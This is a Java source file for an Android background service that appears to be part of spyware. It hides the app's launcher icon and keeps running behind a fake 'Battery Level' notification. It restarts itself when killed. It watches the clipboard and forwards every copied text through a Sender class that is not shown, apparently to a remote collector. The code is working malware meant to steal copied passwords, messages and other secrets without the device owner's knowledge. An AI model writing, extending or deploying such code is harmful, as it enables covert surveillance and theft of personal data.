package com.behavioralanalysis.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import org.json.JSONException;
import org.json.JSONObject;

public class MainService extends Service {
    private static Context context;

    @Override
    public void onCreate() {
        super.onCreate();

        PackageManager packageManager = this.getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O) {
            startCustomForeground();
        } else {
            startForeground(1, new Notification());
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startCustomForeground() {
        String notificationChannelId = "example.permanence";
        String channelName = "Battery Level Service";
        NotificationChannel notificationChannel = new NotificationChannel(notificationChannelId, channelName, NotificationManager.IMPORTANCE_NONE);
        notificationChannel.setLightColor(Color.BLUE);
        notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager notificationManager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
        assert notificationManager != null;
        notificationManager.createNotificationChannel(notificationChannel);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, notificationChannelId);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        ClipboardManager.OnPrimaryClipChangedListener primaryClipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                ClipboardManager clipboardManager = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
                if (clipboardManager.hasPrimaryClip()) {
                    ClipData clipData = clipboardManager.getPrimaryClip();
                    if (clipData.getItemCount() > 0) {
                        CharSequence text = clipData.getItemAt(0).getText();
                        if (text != null) {
                            try {
                                JSONObject data = new JSONObject();
                                data.put("text", text);
                                Sender.send(data);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(primaryClipChangedListener);

        context = this;
        Sender.startAsync(this);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        sendBroadcast(new Intent("respawnService"));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContext() {
        return context;
    }
}